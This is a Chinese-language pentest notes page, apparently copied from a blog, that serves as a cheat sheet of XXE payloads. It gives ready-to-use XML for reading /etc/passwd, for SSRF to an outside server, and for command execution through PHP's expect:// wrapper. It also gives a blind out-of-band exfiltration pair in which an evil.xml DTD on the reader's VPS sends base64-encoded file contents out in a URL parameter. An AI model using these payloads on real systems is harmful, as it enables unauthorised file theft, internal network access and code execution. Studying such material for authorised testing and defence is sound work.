---
data: 2024-06-30
tags:
  - 常见漏洞
关联:
  - "[[book/知识笔记/渗透/外网打点/基础漏洞/基础漏洞]]"
博客链接: https:/www.cnblogs.com/Ho1dF0rward/p/18364762
---
## 基本概念

XML 指可扩展标记语言（eXtensible Markup Language），是一种用于标记电子文件使其具有结构性的标记语言，被设计用来传输和存储数据。

### 文件读取

~~~
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
~~~
### SSRF
~~~
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://publicServer.com/" [
<!ELEMENT data (#ANY)>
]>
<data>4</data>
~~~
### RCE

在php环境下，xml命令执行需要php装有expect扩展

~~~
<?xml version="1.0"?>
<!DOCTYPE GVI [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<catalog>
   <core id="test101">
      <description>&xxe;</description>
   </core>
</catalog>
~~~

## 无回显利用

~~~
<?xml version="1.0"?>
<!DOCTYPE test[
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=D:/1.txt">
<!ENTITY % dtd SYSTEM "http://xxx.xxx.xxx.xxx/evil.xml">
%dtd;
%send;
]>

~~~
evil.xml

~~~
<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://xxx.xxx.xxx.xxx/?content=%file;'>"> %payload;
//%号要进行实体编码成&#x25
~~~

其中 `http://xxx.xxx.xxx.xxx`是你的vps 